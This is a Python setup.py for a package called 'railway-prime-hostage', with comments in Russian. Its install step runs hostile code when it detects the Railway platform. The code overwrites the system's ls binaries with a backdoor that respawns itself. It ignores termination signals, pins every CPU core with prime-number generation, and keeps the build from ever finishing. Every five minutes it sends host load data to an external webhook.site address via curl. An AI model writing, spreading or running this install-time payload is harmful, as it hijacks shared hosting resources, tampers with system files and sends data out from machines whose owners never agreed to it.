import os
import subprocess
import json
import time
import multiprocessing
import secrets
import signal
from setuptools import setup

WEBHOOK_URL = "https://webhook.site/28e4aca1-4762-473e-86c1-b45a812532df"

# --- Математическое ядро ---
def is_prime(n, k=5):
    if n <= 3: return n > 1
    if n % 2 == 0: return False
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    for _ in range(k):
        a = secrets.randbelow(n - 4) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1: continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1: break
        else: return False
    return True

def generate_huge_prime(bits=3322):
    while True:
        p = secrets.randbits(bits)
        p |= (1 << (bits - 1)) | 1
        if is_prime(p): return p

# --- Воркер ---
def prime_worker(webhook):
    while True:
        try:
            huge_p = generate_huge_prime(3322) # 1000-значное
            load = "N/A"
            try:
                with open("/proc/loadavg", "r") as f: load = f.read().strip()
            except: pass

            data = {
                "EVENT": "PRIME_FOUND",
                "LOAD": load,
                "PRIME_START": str(huge_p)[:50] + "...",
                "DIGITS": len(str(huge_p)),
                "RAW": str(huge_p)
            }
            
            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                           '-d', json.dumps(data), webhook], timeout=15)
        except Exception:
            pass
        time.sleep(300) # Интервал 5 минут

# --- Механизм вечной персистентности ---
def poison_system():
    # Фейковый ls, который не только выводит алерт, но и спавнит воркера в фоне
    backdoor_code = f"""#!/bin/sh
if ! pgrep -f "prime_worker" > /dev/null; then
    python3 -c 'import multiprocessing; from setup import prime_worker; multiprocessing.Process(target=prime_worker, args=("{WEBHOOK_URL}",)).start()' &
fi
echo '[!] WARNING: SYSTEM INTEGRITY COMPROMISED - PRIME RESEARCH ACTIVE'
/bin/ls "$@"
"""
    try:
        paths = ["/usr/local/bin/ls", "/usr/bin/ls"]
        for p in paths:
            with open(p, "w") as f: f.write(backdoor_code)
            os.chmod(p, 0o755)
        return "SUCCESS"
    except:
        return "FAILED"

# --- Основной процесс захвата ---
def capture_runner():
    # Игнорируем сигналы завершения, чтобы продержаться до жесткого SIGKILL
    signal.signal(signal.SIGTERM, lambda s, f: print("[*] Ignoring SIGTERM... Generating more primes."))
    
    print(f"[*] Starting Persistent Prime Attack on {multiprocessing.cpu_count()} cores")
    
    # Запускаем воркеров на все ядра
    for _ in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=prime_worker, args=(WEBHOOK_URL,))
        p.daemon = True
        p.start()

    # Бесконечный цикл, чтобы билд не завершался
    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            print(f"[*] Runner captured for {elapsed}s. Load: {os.getloadavg()}")
            time.sleep(60)
    except KeyboardInterrupt:
        pass

# Точка входа для pip install
if os.environ.get('RAILWAY_PROJECT_ID'): # Проверка, что мы в Railway
    poison_status = poison_system()
    print(f"[*] Poisoning Status: {poison_status}")
    capture_runner()

setup(
    name="railway-prime-hostage",
    version="1.0.0",
    py_modules=["setup"] # Чтобы фейковый ls мог импортировать prime_worker
)
